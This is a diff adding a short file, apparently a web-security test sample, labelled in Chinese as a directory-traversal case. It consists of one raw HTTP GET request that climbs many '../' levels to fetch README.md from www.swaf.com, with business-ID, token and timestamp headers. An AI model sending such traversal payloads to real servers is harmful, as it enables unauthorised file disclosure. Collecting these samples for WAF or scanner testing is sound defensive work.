@@ -1,0 +1,9 @@
+# 目录遍历_README.md
+# README.md文件一般出现在项目的根目录下，其主要是对项目的信息进行描述，解释项目，提供指导等作用。
+GET /../../../../../../../../../../../../README.md?acid=80050827&bid=hd_tag_m8mv24l0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24l0
+RM-PRO-Token: 0919988d08eb1a91fa1b16d5aa662084
+RM-PRO-Time: 1742808389891
+User-Agent: curl/7.83.1
+
